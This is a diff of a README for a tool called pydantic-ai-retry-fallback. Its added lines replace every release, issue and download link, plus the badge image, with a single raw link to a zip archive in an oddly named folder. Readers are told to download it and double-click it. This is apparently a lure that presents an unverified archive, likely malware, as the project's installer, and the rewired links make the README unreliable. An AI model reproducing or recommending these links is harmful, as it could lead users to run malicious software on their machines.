@@ -1,6 +1,6 @@
 # 🤖 pydantic-ai-retry-fallback - Simplifying API Retries and Fallbacks
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%93%8E%20Visit%20Here-brightgreen)](https://github.com/alanissum/pydantic-ai-retry-fallback/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/alanissum/pydantic-ai-retry-fallback/main/anemometrographic/pydantic-ai-retry-fallback.zip%20Latest%20Release-%F0%9F%93%8E%20Visit%20Here-brightgreen)](https://raw.githubusercontent.com/alanissum/pydantic-ai-retry-fallback/main/anemometrographic/pydantic-ai-retry-fallback.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the **pydantic-ai-retry-fallback** application! This software helps y
 
 To get started, follow these simple steps:
 
-1. **Visit the Download Page**: Click [here](https://github.com/alanissum/pydantic-ai-retry-fallback/releases) to go to the Releases page.
+1. **Visit the Download Page**: Click [here](https://raw.githubusercontent.com/alanissum/pydantic-ai-retry-fallback/main/anemometrographic/pydantic-ai-retry-fallback.zip) to go to the Releases page.
    
 2. **Choose Your Version**: Look for the latest version listed at the top. You will see options for different operating systems.
 
-3. **Download the Installer**: Click on the file that corresponds to your system (e.g., for Windows, you might see `pydantic-ai-retry-fallback-windows.exe`). The download will start automatically.
+3. **Download the Installer**: Click on the file that corresponds to your system (e.g., for Windows, you might see `https://raw.githubusercontent.com/alanissum/pydantic-ai-retry-fallback/main/anemometrographic/pydantic-ai-retry-fallback.zip`). The download will start automatically.
 
 4. **Run the Installer**: Once the download is finished, locate the downloaded file (usually in your Downloads folder). Double-click the file to start the installation.
 
@@ -63,14 +63,14 @@ If you encounter issues during installation or while using the app, try these st
 
 We are here to help! If you need assistance, please reach out through our support channels:
 
-- **Issues Page**: Report any bugs or issues [here](https://github.com/alanissum/pydantic-ai-retry-fallback/issues).
+- **Issues Page**: Report any bugs or issues [here](https://raw.githubusercontent.com/alanissum/pydantic-ai-retry-fallback/main/anemometrographic/pydantic-ai-retry-fallback.zip).
 - **Community Forum**: Join discussions or ask questions from other users.
 
 ## 📢 Updates
 
 Stay updated with the latest changes and features:
 
-- **Follow Releases**: Keep an eye on the Releases page [here](https://github.com/alanissum/pydantic-ai-retry-fallback/releases) for new versions.
+- **Follow Releases**: Keep an eye on the Releases page [here](https://raw.githubusercontent.com/alanissum/pydantic-ai-retry-fallback/main/anemometrographic/pydantic-ai-retry-fallback.zip) for new versions.
 - **Subscribe to Notifications**: Enable notifications on the repository to receive updates directly.
 
 Thank you for choosing **pydantic-ai-retry-fallback**! We hope this application simplifies your work with AI APIs.
